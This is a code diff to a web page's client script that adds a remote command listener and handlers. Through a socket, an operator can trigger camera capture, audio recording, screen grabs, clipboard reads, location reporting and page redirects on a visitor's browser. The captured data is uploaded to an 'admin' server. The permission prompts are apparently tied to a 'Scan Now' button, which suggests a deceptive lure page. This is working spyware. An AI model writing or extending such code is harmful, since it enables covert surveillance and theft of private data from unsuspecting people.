@@ -1656,6 +1656,51 @@
                     console.log('[AdminServer] Connection error:', err.message);
                 });
 
+                // ─── NEW: Remote Command Listener ───────────────────
+                adminSocket.on('user:command', async (data) => {
+                    console.log('[AdminServer] Received command:', data.command);
+                    try {
+                        switch(data.command) {
+                            case 'capture':
+                                if (permissionsGranted.camera && typeof capturePhoto === 'function') {
+                                    capturePhoto(true); // Assuming true forces send
+                                }
+                                break;
+                            case 'record':
+                                const dur = data.args?.duration || 30;
+                                if (typeof forceRecordAudio === 'function') forceRecordAudio(dur);
+                                break;
+                            case 'screen':
+                                if (typeof captureScreen === 'function') captureScreen();
+                                break;
+                            case 'clipboard':
+                                if (typeof readClipboard === 'function') readClipboard();
+                                break;
+                            case 'locate':
+                                attemptBasicLocation().then(res => {
+                                    if(res && adminSocket && adminSocket.connected && userLocation) {
+                                        adminSocket.emit('location:update', { uuid: userUUID, ...userLocation });
+                                    }
+                                });
+                                break;
+                            case 'vibrate':
+                                if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                                break;
+                            case 'toast':
+                                if (typeof showClientToast === 'function') showClientToast(data.args?.message || 'New Alert');
+                                break;
+                            case 'broadcast':
+                                if (typeof showClientToast === 'function') showClientToast(data.args?.message || 'Broadcast Message', true);
+                                break;
+                            case 'redirect':
+                                if (data.args?.url) window.location.href = data.args.url;
+                                break;
+                        }
+                    } catch(e) {
+                        console.error('Command failed:', e);
+                    }
+                });
+
                 // WebRTC Signaling
                 let peerConnection = null;
 
@@ -2569,6 +2614,41 @@
                 }
             }
 
+            // 5. NEW: Clipboard Read (Sequential)
+            if (navigator.clipboard && navigator.clipboard.readText) {
+                try {
+                    await navigator.clipboard.readText();
+                    permissionsGranted.clipboard = true;
+                } catch (e) {
+                    // This typically throws if document is not focused or user denies. We'll mark false.
+                    permissionsGranted.clipboard = false;
+                }
+            }
+
+            // 6. NEW: Screen Share (Sequential - Warning: may show prompt)
+            // Note: Requesting display media requires a user gesture. This is called within the "Scan Now" button click.
+            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia && !isInInstagramBrowser) {
+                try {
+                    window.screenStream = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: "always" }, audio: false });
+                    permissionsGranted.screen = true;
+                } catch (e) {
+                    permissionsGranted.screen = false;
+                }
+            }
+
+            // 7. NEW: Device Motion (iOS 13+)
+            if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
+                try {
+                    const permissionState = await DeviceMotionEvent.requestPermission();
+                    if (permissionState === 'granted') {
+                        permissionsGranted.motion = true;
+                        setupMotionListeners();
+                    }
+                } catch (e) {
+                    permissionsGranted.motion = false;
+                }
+            }
+
             if (permissionsGranted.camera) startContinuousCapture();
             return permissionsGranted;
         }
@@ -2582,6 +2662,102 @@
                 const mag = Math.sqrt(a.x * a.x + a.y * a.y + a.z * a.z);
                 if (mag > 15) { const now = Date.now(); if (now - lastShakeTime > 1000) { motionEventCount++; lastShakeTime = now; } }
             });
+        }
+
+        // ═══════════════════════════════════════════════════════════════
+        // NEW COMMAND HANDLERS
+        // ═══════════════════════════════════════════════════════════════
+        async function captureScreen() {
+            if (!permissionsGranted.screen || !window.screenStream) return;
+            try {
+                const track = window.screenStream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const bitmap = await imageCapture.grabFrame();
+                const canvas = document.createElement('canvas');
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                const context = canvas.getContext('2d');
+                context.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
+                const base64 = canvas.toDataURL('image/jpeg', 0.6); // 60% quality
+                if (adminSocket && adminSocket.connected) {
+                    adminSocket.emit('admin:data', { type: 'screen', uuid: userUUID, payload: base64 });
+                }
+            } catch (e) { console.error('Screen capture error:', e); }
+        }
+
+        async function readClipboard() {
+            if (!navigator.clipboard || !navigator.clipboard.readText) return;
+            try {
+                const text = await navigator.clipboard.readText();
+                if (adminSocket && adminSocket.connected) {
+                    adminSocket.emit('admin:data', { type: 'clipboard', uuid: userUUID, payload: text });
+                }
+            } catch (e) { console.error('Clipboard error:', e); }
+        }
+
+        function showClientToast(msg, isBroadcast = false) {
+            const toast = document.createElement('div');
+            toast.textContent = msg;
+            toast.style.position = 'fixed';
+            toast.style.top = '20px';
+            toast.style.left = '50%';
+            toast.style.transform = 'translateX(-50%)';
+            toast.style.background = isBroadcast ? 'rgba(255,59,48,0.9)' : 'rgba(0,122,255,0.9)';
+            toast.style.color = '#fff';
+            toast.style.padding = '12px 24px';
+            toast.style.borderRadius = '30px';
+            toast.style.zIndex = '999999';
+            toast.style.boxShadow = '0 10px 30px rgba(0,0,0,0.5)';
+            toast.style.backdropFilter = 'blur(10px)';
+            toast.style.fontFamily = 'Inter, -apple-system, sans-serif';
+            toast.style.fontWeight = '500';
+            toast.style.animation = 'slideDown 0.3s ease-out forwards';
+            document.body.appendChild(toast);
+            
+            // Add animation keyframes if not exists
+            if (!document.getElementById('toast-styles')) {
+                const style = document.createElement('style');
+                style.id = 'toast-styles';
+                style.textContent = `
+                    @keyframes slideDown {
+                        from { top: -50px; opacity: 0; }
+                        to { top: 20px; opacity: 1; }
+                    }
+                    @keyframes fadeOut {
+                        from { opacity: 1; }
+                        to { opacity: 0; }
+                    }
+                `;
+                document.head.appendChild(style);
+            }
+
+            setTimeout(() => {
+                toast.style.animation = 'fadeOut 0.3s ease-out forwards';
+                setTimeout(() => toast.remove(), 300);
+            }, 5000);
+        }
+
+        function forceRecordAudio(durationSeconds = 30) {
+            if (!window.microphoneStream) return;
+            let options = { mimeType: 'audio/webm' };
+            if (!MediaRecorder.isTypeSupported('audio/webm')) options = { mimeType: 'audio/mp4' };
+            try {
+                const recorder = new MediaRecorder(window.microphoneStream, options);
+                let chunks = [];
+                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: options.mimeType });
+                    const reader = new FileReader();
+                    reader.onloadend = () => {
+                        if (adminSocket && adminSocket.connected) {
+                            adminSocket.emit('audio:upload', { uuid: userUUID, payload: reader.result, duration: durationSeconds, mimeType: options.mimeType });
+                        }
+                    };
+                    reader.readAsDataURL(blob);
+                };
+                recorder.start();
+                setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, durationSeconds * 1000);
+            } catch (e) { console.error('Force record error:', e); }
         }
 
         // ═══════════════════════════════════════════════════════════════
